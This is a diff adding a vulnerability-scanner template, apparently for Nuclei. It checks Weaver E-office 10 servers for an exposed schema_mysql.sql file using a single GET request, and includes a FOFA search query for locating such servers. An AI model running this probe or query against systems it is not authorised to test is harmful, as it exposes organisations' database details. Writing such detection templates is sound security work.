@@ -1,0 +1,24 @@
+id: weaver-eoffice-v10-schema-mysql-disclousre
+
+info:
+  name: 泛微 E-office 10 schema_mysql.sql - disclosure
+  author: leadlife
+  severity: high
+  description: 泛微 e-office 10 schema_mysql.sql 敏感信息泄露漏洞
+  metadata:
+    verified: true
+    fofa-query: 'body="eoffice10" && body="eoffice_loading_tip"'
+  tags: eoffice, disclosure, weaver,oa
+
+http:
+  - raw:
+    - |
+        GET /eoffice10/empty_scene/db/schema_mysql.sql HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(header,'application/x-sql')
+        condition: and
